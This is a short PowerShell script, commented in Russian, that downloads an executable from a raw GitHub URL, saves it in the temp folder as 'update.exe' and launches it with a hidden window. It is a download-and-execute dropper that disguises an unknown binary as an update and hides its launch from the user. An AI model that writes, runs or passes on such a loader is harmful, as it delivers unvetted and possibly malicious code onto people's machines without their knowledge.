# === Автоскачивание и запуск ===

$exeUrl = "https://raw.githubusercontent.com/hk1500/s/22bee0700f758a2aafcf592fd66d1bcd208e7644/1.exe"
$exePath = "$env:TEMP\update.exe"

Write-Host "[+] Начинаем скачивание..." -ForegroundColor Yellow

try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
    Write-Host "[+] Скачано успешно!" -ForegroundColor Green
    
    Write-Host "[+] Запускаем..." -ForegroundColor Cyan
    Start-Process -FilePath $exePath -WindowStyle Hidden
    
    Write-Host "[+] Всё готово!" -ForegroundColor Green
} 
catch {
    Write-Host "[-] Ошибка скачивания" -ForegroundColor Red
}

# Не закрываем PowerShell (оставляем окно открытым)
